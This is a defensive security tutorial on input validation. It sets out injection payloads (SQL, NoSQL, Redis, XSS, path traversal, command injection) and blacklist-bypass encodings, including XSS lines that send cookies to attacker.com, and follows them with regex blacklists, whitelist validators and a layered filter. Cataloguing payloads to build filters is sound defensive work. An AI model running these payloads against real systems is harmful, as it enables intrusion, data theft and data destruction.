## Payload Structures for Whitelist & Blacklist Systems

This covers exactly how attack payloads look and how to build proper allow/deny logic against them.

---

## PART 1: Raw Attack Payloads — What They Actually Look Like

### 1. Classic SQL Injection Payloads

```sql
-- Authentication bypass payloads:
' OR '1'='1
' OR '1'='1'--
' OR '1'='1'/*
') OR ('1'='1
' OR 1=1--
' OR 1=1#
' OR 1=1/*
admin'--
admin' #
admin'/*
' OR 'x'='x
') OR ('x'='x

-- Union-based data extraction:
' UNION SELECT null--
' UNION SELECT null,null--
' UNION SELECT null,null,null--
' UNION SELECT username,password FROM users--
' UNION ALL SELECT null,table_name FROM information_schema.tables--
' UNION SELECT 1,group_concat(table_name) FROM information_schema.tables--

-- Error-based extraction:
' AND extractvalue(1,concat(0x7e,database()))--
' AND updatexml(1,concat(0x7e,version()),1)--
' AND (SELECT 1 FROM(SELECT COUNT(*),concat(version(),0x3a,floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)--

-- Blind boolean payloads:
' AND 1=1--          (true condition)
' AND 1=2--          (false condition)
' AND substring(password,1,1)='a'--
' AND ascii(substring(password,1,1))>97--
' AND length(database())=5--

-- Time-based blind payloads:
'; WAITFOR DELAY '0:0:5'--     (MSSQL)
' AND SLEEP(5)--               (MySQL)
' AND pg_sleep(5)--            (PostgreSQL)
'||(SELECT '' FROM dual WHERE 1=1 AND sleep(5))--

-- Stacked queries:
'; INSERT INTO users VALUES('hacker','pass')--
'; DROP TABLE users--
'; EXEC xp_cmdshell('whoami')--    (MSSQL command execution)
'; UPDATE users SET password='hacked' WHERE '1'='1'--
```

---

### 2. NoSQL Injection Payloads

```javascript
// MongoDB operator injection:
{"$gt": ""}              // greater than empty = always true
{"$ne": null}            // not equal null = always true
{"$exists": true}        // field exists = always true
{"$regex": ".*"}         // matches everything
{"$where": "1==1"}       // JavaScript execution
{"$gt": "", "$lt": "~"}  // range that matches everything

// JSON body attacks:
{
  "username": {"$gt": ""},
  "password": {"$gt": ""}
}

// Array injection:
{"username": ["admin", "user"]}

// JavaScript injection via $where:
{"$where": "function(){return true}"}
{"$where": "sleep(5000)"}
{"$where": "this.password.match(/.*/)"}

// Redis injection:
*1\r\n$8\r\nFLUSHALL\r\n    // wipes entire database
*3\r\n$3\r\nSET\r\n$5\r\nadmin\r\n$6\r\nhacked\r\n
```

---

### 3. XSS Payloads That Break Database Output

```html
<!-- Stored in DB, fires when retrieved: -->
<script>document.location='http://attacker.com/steal?c='+document.cookie</script>
<img src=x onerror=alert(document.cookie)>
<svg onload=fetch('http://attacker.com/?d='+document.cookie)>
javascript:alert(1)
<iframe src="javascript:alert(1)">
"><script>alert(1)</script>
'><script>alert(1)</script>
</textarea><script>alert(1)</script>

<!-- Encoded variants that bypass simple blacklists: -->
&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;   (HTML entities)
\u003cscript\u003ealert(1)\u003c/script\u003e    (Unicode)
%3Cscript%3Ealert(1)%3C%2Fscript%3E             (URL encoded)
<ScRiPt>alert(1)</sCrIpT>                        (mixed case)
<scr<script>ipt>alert(1)</scr</script>ipt>       (nested tags)
```

---

### 4. Path Traversal Payloads

```
-- Basic traversal:
../../../etc/passwd
..\..\..\windows\system32\drivers\etc\hosts

-- Encoded variants:
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd    (URL encoded)
%252e%252e%252f                              (double encoded)
..%c0%af../etc/passwd                        (UTF-8 encoded slash)
....//....//....//etc/passwd                 (filter bypass)
..///////..////..//////etc/passwd

-- Null byte injection:
../../../etc/passwd%00.jpg    (truncates at null byte)
../../../etc/passwd\0.jpg
```

---

### 5. Command Injection Payloads

```bash
# Chaining operators:
; ls -la
| whoami
|| cat /etc/passwd
& ipconfig
&& net user
`id`
$(whoami)

# Encoded variants:
%3B ls              (URL encoded semicolon)
%7C whoami          (URL encoded pipe)
$(c\at /et\c/pas\swd)   (backslash bypass)
{cat,/etc/passwd}       (brace bypass)

# Time-based blind:
; sleep 5
| timeout 5
; ping -c 5 127.0.0.1
```

---

## PART 2: Blacklist Design — Pattern Matching Logic

### How Blacklist Circuit Works

```
Input string → [Pattern matcher] → [Token scanner] → Block/Allow
                     ↓
              Compare against
              known bad patterns
              (regex or keyword match)
```

### Blacklist Implementation

```python
import re

# SQL injection blacklist patterns
SQL_BLACKLIST = [
    # Keywords
    r'\bSELECT\b',
    r'\bUNION\b',
    r'\bINSERT\b',
    r'\bUPDATE\b',
    r'\bDELETE\b',
    r'\bDROP\b',
    r'\bEXEC\b',
    r'\bEXECUTE\b',
    r'\bSCRIPT\b',
    r'\bCAST\b',
    r'\bCONVERT\b',

    # Comment sequences
    r'--',
    r'#',
    r'/\*.*?\*/',

    # Operators and functions
    r'\bOR\b\s+\d+=\d+',
    r'\bAND\b\s+\d+=\d+',
    r'\bSLEEP\s*\(',
    r'\bWAITFOR\b',
    r'\bBENCHMARK\s*\(',
    r'\bpg_sleep\s*\(',

    # Special characters
    r"'.*'",                  # quoted strings
    r';\s*\w',                # semicolon followed by word
    r'\bxp_cmdshell\b',       # MSSQL command execution
    r'\binformation_schema\b',# schema enumeration
    r'\bsys\.\w+',            # system tables
]

# NoSQL blacklist patterns
NOSQL_BLACKLIST = [
    r'\$gt', r'\$lt', r'\$ne',
    r'\$where', r'\$exists',
    r'\$regex', r'\$in',
    r'\$or', r'\$and',
    r'function\s*\(',
    r'sleep\s*\(',
]

# XSS blacklist patterns
XSS_BLACKLIST = [
    r'<\s*script',
    r'javascript\s*:',
    r'on\w+\s*=',           # event handlers
    r'<\s*iframe',
    r'<\s*object',
    r'<\s*embed',
    r'<\s*svg',
    r'document\.cookie',
    r'document\.location',
    r'window\.location',
    r'eval\s*\(',
    r'expression\s*\(',
]

def blacklist_check(user_input, blacklist):
    input_lower = user_input.lower()
    for pattern in blacklist:
        if re.search(pattern, input_lower, re.IGNORECASE):
            return {
                "blocked": True,
                "reason": f"Matched pattern: {pattern}",
                "input": user_input
            }
    return {"blocked": False}
```

---

### Why Blacklists Fail — The Bypass Payloads

```sql
-- Keyword splitting:
SEL/*comment*/ECT * FROM users
SE\nLECT * FROM users          (newline in keyword)
SELECT/**/*/**/FROM/**/users   (comments everywhere)

-- Case variation:
SeLeCt * FrOm UsErS
sElEcT * fRoM uSeRs

-- Encoding bypass:
CHAR(83)+CHAR(69)+CHAR(76)+...  (MSSQL char encoding = SELECT)
0x53454c454354                   (hex encoding = SELECT)

-- Double encoding:
%2527 → %27 → '             (double URL encode)
&#39;  → '                   (HTML entity)

-- Whitespace alternatives:
SELECT%09*%09FROM%09users    (tab instead of space)
SELECT%0A*%0AFROM%0Ausers    (newline instead of space)
SELECT%0D*%0DFROM%0Dusers    (carriage return)
SELECT(*)FROM(users)         (parentheses instead of space)
```

**Blacklists are fundamentally weak** — attackers always find encoding or splitting bypass.

---

## PART 3: Whitelist Design — The Correct Approach

### How Whitelist Circuit Works

```
Input → [Type checker] → [Format validator] → [Range checker] → Allow
                ↓               ↓                    ↓
           Reject if       Reject if            Reject if
           wrong type      wrong format         out of range

Default = DENY everything
Only explicitly allowed patterns pass
```

### Whitelist Implementation

```python
import re
from enum import Enum

# Allowed table names — explicit list only
ALLOWED_TABLES = {
    'users', 'products', 'orders',
    'categories', 'reviews', 'inventory'
}

# Allowed column names per table
ALLOWED_COLUMNS = {
    'users':      {'id', 'username', 'email', 'created_at'},
    'products':   {'id', 'name', 'price', 'category_id'},
    'orders':     {'id', 'user_id', 'total', 'status', 'created_at'},
}

# Allowed sort directions
ALLOWED_DIRECTIONS = {'ASC', 'DESC'}

# Allowed operators for filters
ALLOWED_OPERATORS = {'=', '>', '<', '>=', '<=', '!=', 'LIKE'}

class InputType(Enum):
    INTEGER     = 'integer'
    FLOAT       = 'float'
    EMAIL       = 'email'
    USERNAME    = 'username'
    DATE        = 'date'
    PHONE       = 'phone'
    ALPHANUM    = 'alphanumeric'
    UUID        = 'uuid'

# Whitelist patterns — define EXACTLY what is allowed
WHITELIST_PATTERNS = {
    InputType.INTEGER:  r'^\d{1,10}$',
    InputType.FLOAT:    r'^\d{1,8}\.\d{1,4}$',
    InputType.EMAIL:    r'^[a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,}$',
    InputType.USERNAME: r'^[a-zA-Z0-9_\-]{3,30}$',
    InputType.DATE:     r'^\d{4}\-(0[1-9]|1[0-2])\-(0[1-9]|[12]\d|3[01])$',
    InputType.PHONE:    r'^\+?[\d\s\-\(\)]{7,15}$',
    InputType.ALPHANUM: r'^[a-zA-Z0-9\s]{1,100}$',
    InputType.UUID:     r'^[0-9a-f]{8}-[0-9a-f]{4}-4[0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}$',
}

class WhitelistValidator:

    def validate_input(self, value, input_type, min_val=None, max_val=None):
        # Step 1: Type check
        if not isinstance(value, str):
            value = str(value)

        # Step 2: Pattern match
        pattern = WHITELIST_PATTERNS.get(input_type)
        if not pattern or not re.match(pattern, value):
            return {
                "valid": False,
                "reason": f"Does not match allowed pattern for {input_type.value}",
                "value": value
            }

        # Step 3: Range check for numbers
        if input_type == InputType.INTEGER and min_val and max_val:
            num = int(value)
            if not (min_val <= num <= max_val):
                return {
                    "valid": False,
                    "reason": f"Integer out of allowed range {min_val}-{max_val}"
                }

        # Step 4: Length check
        if len(value) > 500:
            return {"valid": False, "reason": "Input too long"}

        return {"valid": True, "sanitized": value}

    def validate_table(self, table_name):
        # Exact match against allowed list — no regex, no contains
        if table_name not in ALLOWED_TABLES:
            return {
                "valid": False,
                "reason": f"Table '{table_name}' not in allowed list"
            }
        return {"valid": True, "table": table_name}

    def validate_column(self, table_name, column_name):
        allowed = ALLOWED_COLUMNS.get(table_name, set())
        if column_name not in allowed:
            return {
                "valid": False,
                "reason": f"Column '{column_name}' not allowed for table '{table_name}'"
            }
        return {"valid": True, "column": column_name}

    def build_safe_query(self, table, column, value, direction="ASC"):
        # Validate every component separately
        t = self.validate_table(table)
        c = self.validate_column(table, column)
        v = self.validate_input(value, InputType.ALPHANUM)
        d = direction.upper() if direction.upper() in ALLOWED_DIRECTIONS else None

        if not all([t["valid"], c["valid"], v["valid"], d]):
            raise ValueError("Query construction blocked — invalid component")

        # Safe to build — all components whitelisted
        # Values still parameterized!
        query = f"SELECT * FROM {t['table']} WHERE {c['column']} = ? ORDER BY {c['column']} {d}"
        return query, [v["sanitized"]]
```

---

## PART 4: Combined Defense — Layered Filter Circuit

```python
class LayeredSecurityFilter:

    def __init__(self):
        self.validator = WhitelistValidator()
        self.blocked_attempts = {}      # track attack IPs
        self.circuit_breaker_count = 0

    def process_input(self, user_input, input_type, ip_address):

        # Layer 1: Circuit breaker — block repeat attackers
        if self.blocked_attempts.get(ip_address, 0) > 5:
            return {
                "status": "CIRCUIT_OPEN",
                "reason": "Too many blocked attempts — IP temporarily banned"
            }

        # Layer 2: Null / empty check
        if not user_input or not user_input.strip():
            return {"status": "BLOCKED", "reason": "Empty input"}

        # Layer 3: Length bomb prevention
        if len(user_input) > 1000:
            self._record_block(ip_address)
            return {"status": "BLOCKED", "reason": "Input too long"}

        # Layer 4: Encoding normalization
        normalized = self._normalize_encoding(user_input)

        # Layer 5: Whitelist validation
        result = self.validator.validate_input(normalized, input_type)
        if not result["valid"]:
            self._record_block(ip_address)
            return {
                "status": "BLOCKED",
                "reason": result["reason"],
                "layer": "whitelist"
            }

        # Layer 6: Blacklist as secondary signal (log only, don't rely on)
        bl_result = blacklist_check(normalized, SQL_BLACKLIST)
        if bl_result["blocked"]:
            self._record_block(ip_address)
            return {
                "status": "BLOCKED",
                "reason": "Blacklist pattern matched",
                "layer": "blacklist"
            }

        return {"status": "ALLOWED", "value": result["sanitized"]}

    def _normalize_encoding(self, value):
        import urllib.parse, html
        # Decode URL encoding repeatedly until stable
        prev = None
        current = value
        while prev != current:
            prev = current
            current = urllib.parse.unquote(current)
        # Decode HTML entities
        current = html.unescape(current)
        # Normalize unicode
        import unicodedata
        current = unicodedata.normalize('NFKC', current)
        return current

    def _record_block(self, ip_address):
        self.blocked_attempts[ip_address] = \
            self.blocked_attempts.get(ip_address, 0) + 1
```

---

## PART 5: Payload Classification Table

| Payload Type | Blacklist Bypassable | Whitelist Blocks | Parameter Blocks |
|---|---|---|---|
| `' OR 1=1--` | Sometimes | Yes | Yes |
| `UNION SELECT` | Sometimes | Yes | Yes |
| `'; DROP TABLE` | Sometimes | Yes | Yes |
| Dynamic table name | No | Yes | No |
| Second order injection | No | Partially | No |
| `{"$gt":""}` NoSQL | Sometimes | Yes | No standard |
| `../../../etc/passwd` | Sometimes | Yes | N/A |
| Double encoded `%2527` | Often | Yes (after normalize) | Yes |
| LIKE `%` wildcard | No | Yes (escape %) | No |
| ReDoS regex | No | Yes (length limit) | No |
| Cartesian bomb | No | Yes (table whitelist) | No |

---

## Core Principle

```
BLACKLIST = "deny what I know is bad"
            → Always incomplete, always bypassable
            → Use only as secondary alarm layer

WHITELIST = "allow only what I know is good"
            → Rejects everything unknown by default
            → Primary defense — correct approach

PARAMETERS = "separate code from data"
             → Protects values only
             → Must combine with whitelist for structure

ENCODING NORMALIZE → then WHITELIST → then PARAMETERIZE → then CIRCUIT BREAK

All four layers together = robust defense
Any single layer alone = exploitable
```
